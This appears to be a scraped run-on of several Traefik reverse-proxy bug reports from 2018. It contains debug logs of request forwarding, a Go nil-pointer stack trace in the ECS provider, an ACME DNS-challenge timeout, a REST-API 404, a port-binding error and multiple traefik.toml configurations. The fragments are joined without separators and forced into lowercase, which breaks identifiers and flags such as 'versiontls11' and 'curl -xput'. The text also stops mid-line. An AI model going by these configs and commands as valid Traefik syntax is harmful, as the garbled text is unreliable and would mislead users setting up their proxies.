debu[2018-03-08t18:11:42+01:00] vulcand/oxy/forward: completed servehttp on request request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"zalenium2-test2.mydomain.com","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59217","requesturi":"/","tls":null}"
debu[2018-03-08t18:11:42+01:00] vulcand/oxy/roundrobin/rr: competed servehttp on request request="{"method":"get","url":{"scheme":"","opaque":"","user":null,"host":"","path":"/","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59217","requesturi":"/","tls":null}"
debu[2018-03-08t18:11:44+01:00] refreshing healthcheck for currentbackend httpzalenium
debu[2018-03-08t18:11:44+01:00] vulcand/oxy/roundrobin/rr: begin servehttp on request request="{"method":"get","url":{"scheme":"","opaque":"","user":null,"host":"","path":"/","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59221","requesturi":"/","tls":null}"
debu[2018-03-08t18:11:44+01:00] vulcand/oxy/roundrobin/rr: forwarding this request to url request="{"method":"get","url":{"scheme":"","opaque":"","user":null,"host":"","path":"/","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59221","requesturi":"/","tls":null}" forwardurl=
debu[2018-03-08t18:11:44+01:00] vulcand/oxy/forward: begin servehttp on request request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"zalenium-test.mydomain.com","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59221","requesturi":"/","tls":null}"
debu[2018-03-08t18:11:44+01:00] vulcand/oxy/forward/http: begin servehttp on request request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"zalenium-test.mydomain.com","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59221","requesturi":"/","tls":null}"
debu[2018-03-08t18:11:44+01:00] vulcand/oxy/forward/http: round trip: code: 200, length: 1577, duration: 20.483ms
debu[2018-03-08t18:11:44+01:00] vulcand/oxy/forward/http: completed servehttp on request request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"zalenium-test.mydomain.com","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59221","requesturi":"/","tls":null}"
debu[2018-03-08t18:11:44+01:00] vulcand/oxy/forward: completed servehttp on request request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"zalenium-test.mydomain.com","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59221","requesturi":"/","tls":null}"
debu[2018-03-08t18:11:44+01:00] vulcand/oxy/roundrobin/rr: competed servehttp on request request="{"method":"get","url":{"scheme":"","opaque":"","user":null,"host":"","path":"/","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59221","requesturi":"/","tls":null}"
debu[2018-03-08t18:11:45+01:00] vulcand/oxy/roundrobin/rr: begin servehttp on request request="{"method":"get","url":{"scheme":"","opaque":"","user":null,"host":"","path":"/","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59223","requesturi":"/","tls":null}"
debu[2018-03-08t18:11:45+01:00] vulcand/oxy/roundrobin/rr: forwarding this request to url forwardurl= request="{"method":"get","url":{"scheme":"","opaque":"","user":null,"host":"","path":"/","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59223","requesturi":"/","tls":null}"
debu[2018-03-08t18:11:45+01:00] vulcand/oxy/forward: begin servehttp on request request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"zalenium2-test2.mydomain.com","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59223","requesturi":"/","tls":null}"
debu[2018-03-08t18:11:45+01:00] vulcand/oxy/forward/http: begin servehttp on request request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"zalenium2-test2.mydomain.com","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59223","requesturi":"/","tls":null}"
debu[2018-03-08t18:11:45+01:00] vulcand/oxy/forward/http: round trip: code: 200, length: 1577, duration: 16.214ms
debu[2018-03-08t18:11:45+01:00] vulcand/oxy/forward/http: completed servehttp on request request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"zalenium2-test2.mydomain.com","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59223","requesturi":"/","tls":null}"
debu[2018-03-08t18:11:45+01:00] vulcand/oxy/forward: completed servehttp on request request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"zalenium2-test2.mydomain.com","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59223","requesturi":"/","tls":null}"
debu[2018-03-08t18:11:45+01:00] vulcand/oxy/roundrobin/rr: competed servehttp on request request="{"method":"get","url":{"scheme":"","opaque":"","user":null,"host":"","path":"/","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59223","requesturi":"/","tls":null}"
debu[2018-03-08t18:11:46+01:00] vulcand/oxy/roundrobin/rr: begin servehttp on request request="{"method":"get","url":{"scheme":"","opaque":"","user":null,"host":"","path":"/","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59225","requesturi":"/","tls":null}"
debu[2018-03-08t18:11:46+01:00] vulcand/oxy/roundrobin/rr: forwarding this request to url request="{"method":"get","url":{"scheme":"","opaque":"","user":null,"host":"","path":"/","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59225","requesturi":"/","tls":null}" forwardurl=
debu[2018-03-08t18:11:46+01:00] vulcand/oxy/forward: begin servehttp on request request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"zalenium-test.mydomain.com","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59225","requesturi":"/","tls":null}"
debu[2018-03-08t18:11:46+01:00] vulcand/oxy/forward/http: begin servehttp on request request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"zalenium-test.mydomain.com","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59225","requesturi":"/","tls":null}"
debu[2018-03-08t18:11:46+01:00] vulcand/oxy/forward/http: round trip: code: 200, length: 1577, duration: 10.807ms
debu[2018-03-08t18:11:46+01:00] vulcand/oxy/forward/http: completed servehttp on request request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"zalenium-test.mydomain.com","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59225","requesturi":"/","tls":null}"
debu[2018-03-08t18:11:46+01:00] vulcand/oxy/forward: completed servehttp on request request="{"method":"get","url":{"scheme":"http","opaque":"","user":null,"host":"zalenium-test.mydomain.com","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59225","requesturi":"/","tls":null}"
debu[2018-03-08t18:11:46+01:00] vulcand/oxy/roundrobin/rr: competed servehttp on request request="{"method":"get","url":{"scheme":"","opaque":"","user":null,"host":"","path":"/","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.54.0"]},"contentlength":0,"transferencoding":null,"host":"localhost:8080","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"[::1]:59225","requesturi":"/","tls":null}"
``` </details>
``` ### if applicable, please paste the log output in debug mode (`--debug` switch) ```
error in go routine: runtime error: invalid memory address or nil pointer dereference
goroutine 23 [running]:
runtime/debug.stack( , , ) /usr/local/go/src/runtime/debug/stack.go:24 +
runtime/debug.printstack() /usr/local/go/src/runtime/debug/stack.go:16 +
github.com/containous/traefik/safe.defaultrecovergoroutine( , ) /go/src/github.com/containous/traefik/safe/routine.go:148 +
github.com/containous/traefik/safe.operationwithrecover.func1.1( ) /go/src/github.com/containous/traefik/safe/routine.go:156 +
panic( , ) /usr/local/go/src/runtime/panic.go:491 +
github.com/containous/traefik/provider/ecs.(*provider).listinstances( , , , , , , , , ) /go/src/github.com/containous/traefik/provider/ecs/ecs.go:311 +
github.com/containous/traefik/provider/ecs.(*provider).loadecsconfig( , , , , , , ) /go/src/github.com/containous/traefik/provider/ecs/ecs.go:210 +
github.com/containous/traefik/provider/ecs.(*provider).provide.func2.2( , ) /go/src/github.com/containous/traefik/provider/ecs/ecs.go:130 +
github.com/containous/traefik/safe.operationwithrecover.func1( , ) /go/src/github.com/containous/traefik/safe/routine.go:160 +
github.com/containous/traefik/vendor/github.com/cenk/backoff.retrynotify( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/cenk/backoff/retry.go:37 +
github.com/containous/traefik/provider/ecs.(*provider).provide.func2( ) /go/src/github.com/containous/traefik/provider/ecs/ecs.go:167 +
github.com/containous/traefik/safe.(*pool).go.func1() /go/src/github.com/containous/traefik/safe/routine.go:78 +
github.com/containous/traefik/safe.gowithrecover.func1( , ) /go/src/github.com/containous/traefik/safe/routine.go:142 +
created by github.com/containous/traefik/safe.gowithrecover /go/src/github.com/containous/traefik/safe/routine.go:136 +
defaultentrypoints = ["http", "https"]
loglevel = "info" [entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" compress = true [entrypoints.https.tls] minversion = "versiontls11" [entrypoints.api] address = ":8080" [api] entrypoint = "api" [acme]
email = "<myemail>"
storage = "/etc/traefik/certs/acme.json"
entrypoint = "https"
onhostrule = true [acme.dnschallenge] provider = "cloudflare" [docker]
endpoint = "unix:///var/run/docker.sock"
domain = "<mydomain>"
watch = true
exposedbydefault = false
usebindportip = true
swarmmode = false
not much more info in the debug log:
traefik | time="2018-03-06t23:07:07z" level=info msg="using toml configuration file /etc/traefik/traefik.toml"
traefik | time="2018-03-06t23:07:07z" level=info msg="traefik version v1.5.3 built on 2018-02-27_02:47:04pm"
traefik | time="2018-03-06t23:07:07z" level=info msg="
traefik | stats collection is disabled.
traefik | help us improve traefik by turning this feature on :)
traefik | more details on: #collected-data
traefik | "
traefik | time="2018-03-06t23:07:07z" level=debug msg="global configuration loaded {"lifecycle":{"requestacceptgracetimeout":"0s","gracetimeout":"10s"},"gracetimeout":"0s","debug":true,"checknewversion":true,"sendanonymoususage":false,"accesslogsfile":"","accesslog":null,"traefiklogsfile":"","traefiklog":null,"loglevel":"debug","entrypoints":{"api":{"network":"","address":":8080","tls":null,"redirect":null,"auth":null,"whitelistsourcerange":null,"compress":false,"proxyprotocol":null,"forwardedheaders":{"insecure":true,"trustedips":null}},"http":{"network":"","address":":80","tls":null,"redirect":{"entrypoint":"https"},"auth":null,"whitelistsourcerange":null,"compress":false,"proxyprotocol":null,"forwardedheaders":{"insecure":true,"trustedips":null}},"https":{"network":"","address":":443","tls":{"minversion":"versiontls11","ciphersuites":null,"certificates":null,"clientcafiles":null,"clientca":{"files":null,"optional":false}},"redirect":null,"auth":null,"whitelistsourcerange":null,"compress":true,"proxyprotocol":null,"forwardedheaders":{"insecure":true,"trustedips":null}}},"cluster":null,"constraints":[],"acme":{"email":"<myemail>","domains":null,"storage":"/etc/traefik/certs/acme.json","storagefile":"","ondemand":false,"onhostrule":true,"caserver":"","entrypoint":"https","dnschallenge":{"provider":"cloudflare","delaybeforecheck":"0s"},"httpchallenge":null,"dnsprovider":"","delaydontcheckdns":"0s","acmelogging":false,"tlsconfig":null},"defaultentrypoints":["http","https"],"providersthrottleduration":"2s","maxidleconnsperhost":200,"idletimeout":"0s","insecureskipverify":false,"rootcas":null,"retry":null,"healthcheck":{"interval":"30s"},"respondingtimeouts":null,"forwardingtimeouts":null,"web":null,"docker":{"watch":true,"filename":"","constraints":null,"trace":false,"debugloggeneratedtemplate":false,"endpoint":"unix:///var/run/docker.sock","domain":"<mydomain>","tls":null,"exposedbydefault":false,"usebindportip":true,"swarmmode":false},"file":null,"marathon":null,"consul":null,"consulcatalog":null,"etcd":null,"zookeeper":null,"boltdb":null,"kubernetes":null,"mesos":null,"eureka":null,"ecs":null,"rancher":null,"dynamodb":null,"servicefabric":null,"rest":null,"api":{"entrypoint":"api","dashboard":true,"debug":true,"currentconfigurations":null,"statistics":null},"metrics":null,"ping":null}"
traefik | time="2018-03-06t23:07:07z" level=info msg="preparing server api &{network: address::8080 tls:<nil> redirect:<nil> auth:<nil> whitelistsourcerange:[] compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s"
traefik | time="2018-03-06t23:07:07z" level=info msg="preparing server http &{network: address::80 tls:<nil> redirect: auth:<nil> whitelistsourcerange:[] compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s"
traefik | time="2018-03-06t23:07:07z" level=info msg="starting server on :8080"
traefik | time="2018-03-06t23:07:07z" level=info msg="preparing server https &{network: address::443 tls: redirect:<nil> auth:<nil> whitelistsourcerange:[] compress:true proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s"
traefik | time="2018-03-06t23:07:07z" level=info msg="starting server on :80"
traefik | time="2018-03-06t23:07:19z" level=info msg="generating acme account..."
traefik | time="2018-03-06t23:08:03z" level=debug msg="building acme client..."
traefik | time="2018-03-06t23:08:05z" level=debug msg="using dns challenge provider: cloudflare"
traefik | time="2018-03-06t23:08:05z" level=info msg=register...
traefik | time="2018-03-06t23:08:23z" level=error msg="error creating tls config: failed to post jws message
-> failed to http post to -> post net/http: timeout awaiting response headers"
traefik | time="2018-03-06t23:08:23z" level=fatal msg="error preparing server: failed to post jws message
-> failed to http post to -> post net/http: timeout awaiting response headers"
loglevel = "debug" [api]
dashboard = true [rest]
entrypoint = "traefik"
api call from clients:
curl -xput " " -d \'{ "frontends" : { "frontend1" : {"backend" : "backend1" } }, "backends" : { "backend1" : { "servers" : { "server1" : { "url" : "www.google.com" } } } } }\'
404 page not found
``` ### if applicable, please paste the log output in debug mode (`--debug` switch) ```
info[2018-02-27t16:46:30+01:00] using toml configuration file /root/traefik_rest.toml info[2018-02-27t16:46:30+01:00] traefik version v1.5.2 built on 2018-02-12_10:56:31am info[2018-02-27t16:46:30+01:00] stats collection is disabled.
help us improve traefik by turning this feature on :)
more details on: #collected-data debu[2018-02-27t16:46:30+01:00] global configuration loaded {"lifecycle":{"requestacceptgracetimeout":0,"gracetimeout":0},"gracetimeout":0,"debug":false,"checknewversion":true,"sendanonymoususage":false,"accesslogsfile":"","accesslog":null,"traefiklogsfile":"","traefiklog":null,"loglevel":"debug","entrypoints":{"http":{"network":"","address":":80","tls":null,"redirect":null,"auth":null,"whitelistsourcerange":null,"compress":false,"proxyprotocol":null,"forwardedheaders":{"insecure":true,"trustedips":null}},"traefik":{"network":"","address":":8080","tls":null,"redirect":null,"auth":null,"whitelistsourcerange":null,"compress":false,"proxyprotocol":null,"forwardedheaders":{"insecure":true,"trustedips":null}}},"cluster":null,"constraints":[],"acme":null,"defaultentrypoints":["http"],"providersthrottleduration":2000000000,"maxidleconnsperhost":200,"idletimeout":0,"insecureskipverify":false,"rootcas":null,"retry":null,"healthcheck":{"interval":30000000000},"respondingtimeouts":null,"forwardingtimeouts":null,"web":null,"docker":null,"file":null,"marathon":null,"consul":null,"consulcatalog":null,"etcd":null,"zookeeper":null,"boltdb":null,"kubernetes":null,"mesos":null,"eureka":null,"ecs":null,"rancher":null,"dynamodb":null,"servicefabric":null,"rest":{"entrypoint":"traefik","currentconfigurations":null},"api":{"entrypoint":"traefik","dashboard":true,"debug":false,"currentconfigurations":null,"statistics":null},"metrics":null,"ping":null} info[2018-02-27t16:46:30+01:00] preparing server http &{network: address::80 tls:<nil> redirect:<nil> auth:<nil> whitelistsourcerange:[] compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s info[2018-02-27t16:46:30+01:00] preparing server traefik &{network: address::8080 tls:<nil> redirect:<nil> auth:<nil> whitelistsourcerange:[] compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s info[2018-02-27t16:46:30+01:00] starting server on :80 info[2018-02-27t16:46:30+01:00] starting provider *rest.provider {"entrypoint":"traefik","currentconfigurations":{}} info[2018-02-27t16:46:30+01:00] starting server on :8080 ^cinfo[2018-02-27t16:50:46+01:00] i have to go..
interrupt info[2018-02-27t16:50:46+01:00] stopping server gracefully debu[2018-02-27t16:50:46+01:00] waiting 0s seconds before killing connections on entrypoint traefik..
debu[2018-02-27t16:50:46+01:00] waiting 0s seconds before killing connections on entrypoint http..
debu[2018-02-27t16:50:46+01:00] entrypoint traefik closed debu[2018-02-27t16:50:46+01:00] entrypoint http closed info[2018-02-27t16:50:46+01:00] server stopped info[2018-02-27t16:50:46+01:00] shutting down
_no need for a configuration file_ ### if applicable, please paste the log output in debug mode (`--debug` switch) ```
$ traefik -c /tmp/foo/bar --debug
info[2018-02-25t04:22:15+01:00] traefik version dev built on i don't remember exactly
info[2018-02-25t04:22:15+01:00]
stats collection is disabled.
help us improve traefik by turning this feature on :)
more details on: #collected-data debu[2018-02-25t04:22:15+01:00] global configuration loaded {"lifecycle":{"requestacceptgracetimeout":0,"gracetimeout":0},"gracetimeout":0,"debug":true,"checknewversion":true,"sendanonymoususage":false,"accesslogsfile":"","accesslog":null,"traefiklogsfile":"","traefiklog":null,"loglevel":"debug","entrypoints":{"http":{"network":"","address":":80","tls":null,"redirect":null,"auth":null,"whitelistsourcerange":null,"compress":false,"proxyprotocol":null,"forwardedheaders":{"insecure":true,"trustedips":null}}},"cluster":null,"constraints":[],"acme":null,"defaultentrypoints":["http"],"providersthrottleduration":2000000000,"maxidleconnsperhost":200,"idletimeout":0,"insecureskipverify":false,"rootcas":null,"retry":null,"healthcheck":{"interval":30000000000},"respondingtimeouts":null,"forwardingtimeouts":null,"web":null,"docker":null,"file":null,"marathon":null,"consul":null,"consulcatalog":null,"etcd":null,"zookeeper":null,"boltdb":null,"kubernetes":null,"mesos":null,"eureka":null,"ecs":null,"rancher":null,"dynamodb":null,"servicefabric":null,"rest":null,"api":null,"metrics":null,"ping":null}
info[2018-02-25t04:22:15+01:00] preparing server http &{network: address::80 tls:<nil> redirect:<nil> auth:<nil> whitelistsourcerange:[] compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s
erro[2018-02-25t04:22:15+01:00] error opening listener listen tcp :80: bind: permission denied
fata[2018-02-25t04:22:15+01:00] error preparing server: listen tcp :80: bind: permission denied
defaultentrypoints = ["http","https"]
debug = false
loglevel = "info" [entrypoints] [entrypoints.http] address = ":80" compress = true [entrypoints.https] address = ":443" [entrypoints.https.tls] [web] address = ":8080" [metrics] [metrics.prometheus] buckets=[0.1,0.3,1.2,5.0] entrypoint = "traefik" [acme]
email = "aaa.@aaa.com"
storage = "/etc/traefik/acme.json"
acmelogging = true
entrypoint = "https"
ondemand = false
onhostrule = true
caserver = " "
[acme.httpchallenge]
entrypoint="http"
#### scenario 2:
debug = true
checknewversion = true
loglevel = "info"
defaultentrypoints = ["http", "https"] [entrypoints] [entrypoints.http] address = ":80" compress = true [entrypoints.https] address = ":443" compress = true [entrypoints.https.tls] [retry] [acme]
email = "my-email@some-domain.tld"
storage = "/etc/traefik/acme.json"
entrypoint = "https"
acmelogging = true
onhostrule = true ################################################################
# file configuration backend
################################################################
[backends] [backends.dgda-api-v1] [backends.dgda-api-v1.loadbalancer] method = "drr" [backends.dgda-api-v1.healthcheck] path = "/" interval = "5s" port = 8080 [backends.dgda-api-v1.servers.server-1] url = " " weight = 4 [backends.dgda-api-v1.servers.server-2] url = " " weight = 2 [backends.dgda-api-v1.servers.server-3] url = " " weight = 2 #[backends.dgda-api-v1.servers.server-4] #url = " " #weight = 4 [backends.tsno-api-v1] [backends.tsno-api-v1.loadbalancer] method = "drr" [backends.tsno-api-v1.healthcheck] path = "/" interval = "5s" [backends.tsno-api-v1.servers.server-1] url = " " weight = 10 [backends.tsno-api-v1.servers.server-2] url = " " weight = 10 [backends.tsse-api-v1] [backends.tsse-api-v1.loadbalancer] method = "drr" [backends.tsse-api-v1.healthcheck] path = "/" interval = "5s" [backends.tsse-api-v1.servers.server-1] url = " " weight = 10 [backends.tsse-api-v1.servers.server-2] url = " " weight = 10 [frontends] [frontends.dgda-api-v1-fe] backend = "dgda-api-v1" entrypoints = ["http", "https"] passhostheader = true priority = 10 [frontends.dgda-api-v1-fe.routes.dgda-api] rule = "host:api.duglemmerdetaldrig.dk" [frontends.tsno-api-v1-fe] backend = "tsno-api-v1" entrypoints = ["http", "https"] passhostheader = true priority = 10 [frontends.tsno-api-v1-fe.routes.tsno-api] rule = "host:api.truestory.no" [frontends.tsse-api-v1-fe] backend = "tsse-api-v1" entrypoints = ["http", "https"] passhostheader = true priority = 10 [frontends.tsse-api-v1-fe.routes.tsse-api] rule = "host:api.truestory.se" [[tls]] entrypoints = ["https"] [tls.certificate] certfile = "/ssl-certs/api.duglemmerdetaldrig.dk.pem" keyfile = "/ssl-certs/api.duglemmerdetaldrig.dk.key"
[[tls]] entrypoints = ["https"] [tls.certificate] certfile = "/ssl-certs/api.truestory.no.pem" keyfile = "/ssl-certs/api.truestory.no.key"
[[tls]] entrypoints = ["https"] [tls.certificate] certfile = "/ssl-certs/api.truestory.se.pem" keyfile = "/ssl-certs/api.truestory.se.key"
``` #### scenario 1:
only change is to the acme-part:
#email = "my-email@some-domain.tld"
#storage = "/etc/traefik/acme.json"
#entrypoint = "https"
#acmelogging = true
#onhostrule = true
``` ### if applicable, please paste the log output in debug mode (`--debug` switch) #### scenario 1 <details> ```shell
time="2018-02-23t16:44:52z" level=info msg="using toml configuration file /etc/traefik/traefik.toml" time="2018-02-23t16:44:52z" level=info msg="traefik version v1.5.2 built on 2018-02-12_10:56:31am" time="2018-02-23t16:44:52z" level=info msg="
stats collection is disabled.
help us improve traefik by turning this feature on :)
more details on: #collected-data
" time="2018-02-23t16:44:52z" level=debug msg="global configuration loaded {"lifecycle":{"requestacceptgracetimeout":0,"gracetimeout":0},"gracetimeout":0,"debug":true,"checknewversion":true,"sendanonymoususage":false,"accesslogsfile":"","accesslog":null,"traefiklogsfile":"","traefiklog":null,"loglevel":"debug","entrypoints":{"http":{"network":"","address":":80","tls":null,"redirect":null,"auth":null,"whitelistsourcerange":null,"compress":true,"proxyprotocol":null,"forwardedheaders":{"insecure":true,"trustedips":null}},"https":{"network":"","address":":443","tls":{"minversion":"","ciphersuites":null,"certificates":null,"clientcafiles":null,"clientca":{"files":null,"optional":false}},"redirect":null,"auth":null,"whitelistsourcerange":null,"compress":true,"proxyprotocol":null,"forwardedheaders":{"insecure":true,"trustedips":null}}},"cluster":null,"constraints":[],"acme":null,"defaultentrypoints":["http","https"],"providersthrottleduration":2000000000,"maxidleconnsperhost":200,"idletimeout":0,"insecureskipverify":false,"rootcas":null,"retry":{"attempts":0},"healthcheck":{"interval":30000000000},"respondingtimeouts":null,"forwardingtimeouts":null,"web":null,"docker":null,"file":{"watch":true,"filename":"/etc/traefik/traefik.toml","constraints":null,"trace":false,"debugloggeneratedtemplate":false,"directory":""},"marathon":null,"consul":null,"consulcatalog":null,"etcd":null,"zookeeper":null,"boltdb":null,"kubernetes":null,"mesos":null,"eureka":null,"ecs":null,"rancher":null,"dynamodb":null,"servicefabric":null,"rest":null,"api":null,"metrics":null,"ping":null}" time="2018-02-23t16:44:52z" level=info msg="preparing server http &{network: address::80 tls:<nil> redirect:<nil> auth:<nil> whitelistsourcerange:[] compress:true proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s" time="2018-02-23t16:44:52z" level=info msg="preparing server https &{network: address::443 tls: redirect:<nil> auth:<nil> whitelistsourcerange:[] compress:true proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s" time="2018-02-23t16:44:52z" level=info msg="starting server on :80" time="2018-02-23t16:44:53z" level=info msg="starting provider *file.provider {"watch":true,"filename":"/etc/traefik/traefik.toml","constraints":null,"trace":false,"debugloggeneratedtemplate":false,"directory":""}" time="2018-02-23t16:44:53z" level=info msg="starting server on :443" time="2018-02-23t16:44:53z" level=debug msg="configuration received from provider file: {"backends":{"dgda-api-v1":{"servers":{"server-1":{"url":" ","weight":4},"server-2":{"url":" ","weight":2},"server-3":{"url":" ","weight":2}},"loadbalancer":{"method":"drr"},"healthcheck":{"path":"/","port":8080,"interval":"5s"}},"tsno-api-v1":{"servers":{"server-1":{"url":" ","weight":10},"server-2":{"url":" ","weight":10}},"loadbalancer":{"method":"drr"},"healthcheck":{"path":"/","interval":"5s"}},"tsse-api-v1":{"servers":{"server-1":{"url":" ","weight":10},"server-2":{"url":" 